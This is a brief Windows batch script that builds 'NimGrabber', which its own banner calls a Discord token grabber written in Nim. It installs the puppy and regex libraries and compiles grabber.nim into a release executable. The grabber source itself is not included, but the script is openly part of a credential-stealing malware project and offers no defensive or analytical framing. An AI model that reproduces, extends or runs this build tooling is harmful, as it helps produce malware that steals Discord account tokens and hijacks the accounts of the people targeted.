@echo off & title NimGrabber Compiler & cls & color 2
echo  _______  .__          ________            ___.  ___.                 
echo  \      ^\ ^|__^| _____  /  _____/___________ ^\_ ^|__^\_ ^|__   ___________ 
echo  /   ^|   \^|  ^|/     ^\/   ^\  __^\_  __ ^\__  ^\ ^| __ \^| __ ^\_/ __ \_  __ \
echo /    ^|    \  ^|       \    \_\  \  ^| ^\// __ \^| \_\ \ \_\ \  ___/^|  ^| \/
echo ^\____^|__  ^/__^|__^|_^|  ^/^\______  ^/__^|  ^(____  ^/___  ^/___  ^/^\___  ^>__^|   
echo         \/         \/        \/           \/    \/    \/     \/       
echo                Discord Token Grabber written in Nim
echo. & echo [INFO] Installing dependencies...
nimble install puppy
nimble install regex
echo [INFO] Compiling the exe...
nim c -d:release grabber.nim
